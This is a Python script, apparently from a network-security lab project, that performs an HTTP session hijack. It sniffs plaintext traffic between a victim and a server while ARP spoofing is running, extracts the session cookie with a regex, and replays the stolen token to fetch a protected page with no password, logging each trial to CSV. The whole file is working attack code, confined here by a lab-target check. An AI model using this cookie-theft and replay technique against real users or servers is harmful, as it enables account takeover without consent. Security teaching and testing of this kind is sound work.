#!/usr/bin/env python3
"""
Phase 4 - HTTP Session Hijack (Design Report Section 4 / Section 3.5).

Requires the attacker to already be on-path (arp_spoof.py running) so the
victim's plaintext HTTP login is visible on this machine's interface. This
script sniffs for the Cookie / Set-Cookie header carrying the session
token, then issues its own GET /account request from the attacker machine
using only that token -- proving the server cannot tell the replay from the
real client (no password involved at any point).

Run on the ATTACKER VM (192.168.56.30), after the real client has logged
in through a browser/curl pointed at the server:
    sudo python3 attacker/cookie_replay.py --client 192.168.56.10 \
        --server 192.168.56.20 --port 80 --iface eth1

For the report's plots, replay the same stolen token several times and log
each attempt to CSV:
    sudo python3 attacker/cookie_replay.py --client 192.168.56.10 \
        --server 192.168.56.20 --port 80 --iface eth1 \
        --trials 10 --trial-interval 2
"""

import argparse
import csv
import os
import re
import time
from datetime import datetime, timezone

import requests
from scapy.all import IP, TCP, sniff

from common import require_lab_targets, setup_logging

log = setup_logging("cookie_replay")

CSV_FIELDS = [
    "trial", "timestamp", "client_ip", "server_ip", "port", "path",
    "token", "status_code", "latency_ms", "success",
]

# Section 3.5: "Cookie: session=abc123xyz" (request) and
# "Set-Cookie: session=abc123xyz; Path=/" (response) -- either is enough.
COOKIE_RE = re.compile(rb"(?:Cookie|Set-Cookie):\s*session=([^\r\n;]+)")


def sniff_session_token(client_ip, server_ip, port, iface, capture_timeout):
    found = {}

    def on_packet(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer("Raw")):
            return
        if {pkt[IP].src, pkt[IP].dst} != {client_ip, server_ip}:
            return
        payload = bytes(pkt["Raw"].load)
        match = COOKIE_RE.search(payload)
        if match:
            found["token"] = match.group(1).decode()
            found["seen"] = True

    log.info(
        "Sniffing HTTP traffic between %s and %s:%d for the session cookie "
        "(log in as the client now if you haven't already)...",
        client_ip, server_ip, port,
    )
    sniff(
        iface=iface,
        filter=f"tcp and host {client_ip} and host {server_ip} and port {port}",
        prn=on_packet,
        timeout=capture_timeout,
        stop_filter=lambda p: found.get("seen", False),
    )
    return found.get("token")


def replay_cookie(server_ip, port, path, token):
    url = f"http://{server_ip}:{port}{path}" if port != 80 else f"http://{server_ip}{path}"
    log.info("Replaying stolen cookie 'session=%s' to GET %s (no credentials sent)", token, url)
    start = time.monotonic()
    response = requests.get(url, cookies={"session": token}, timeout=5)
    latency_ms = round((time.monotonic() - start) * 1000, 1)
    return response, latency_ms


def append_csv_row(csv_path, row):
    os.makedirs(os.path.dirname(csv_path) or ".", exist_ok=True)
    write_header = not os.path.exists(csv_path)
    with open(csv_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        if write_header:
            writer.writeheader()
        writer.writerow(row)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--client", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--path", default="/account")
    parser.add_argument("--iface", required=True)
    parser.add_argument("--capture-timeout", type=int, default=30)
    parser.add_argument("--trials", type=int, default=1, help="replay the stolen cookie this many times")
    parser.add_argument("--trial-interval", type=float, default=2.0, help="seconds to wait between trials")
    parser.add_argument("--csv", default="results/cookie_replay_results.csv", help="path to append per-trial results")
    args = parser.parse_args()

    require_lab_targets(args.client, args.server)

    token = sniff_session_token(args.client, args.server, args.port, args.iface, args.capture_timeout)
    if not token:
        raise SystemExit(
            "[ERROR] No session cookie observed. Make sure arp_spoof.py is "
            "running and the client logged in over HTTP during the capture window."
        )
    log.info("Captured session token: %s", token)

    for trial_num in range(1, args.trials + 1):
        response, latency_ms = replay_cookie(args.server, args.port, args.path, token)
        success = response.status_code == 200
        log.info("Trial %d RESULT: HTTP %d (%.1f ms) from %s", trial_num, response.status_code, latency_ms, args.server)
        if success:
            log.info("Trial %d: hijack succeeded -- protected page returned with no credentials.", trial_num)
        else:
            log.info("Trial %d: server did not return the protected page.", trial_num)

        append_csv_row(args.csv, {
            "trial": trial_num,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "client_ip": args.client,
            "server_ip": args.server,
            "port": args.port,
            "path": args.path,
            "token": token,
            "status_code": response.status_code,
            "latency_ms": latency_ms,
            "success": success,
        })

        if trial_num == 1:
            print("\n--- response body (trial 1) ---")
            print(response.text)

        if trial_num < args.trials:
            time.sleep(args.trial_interval)

    log.info("Done: %d trial(s) logged to %s", args.trials, args.csv)


if __name__ == "__main__":
    main()
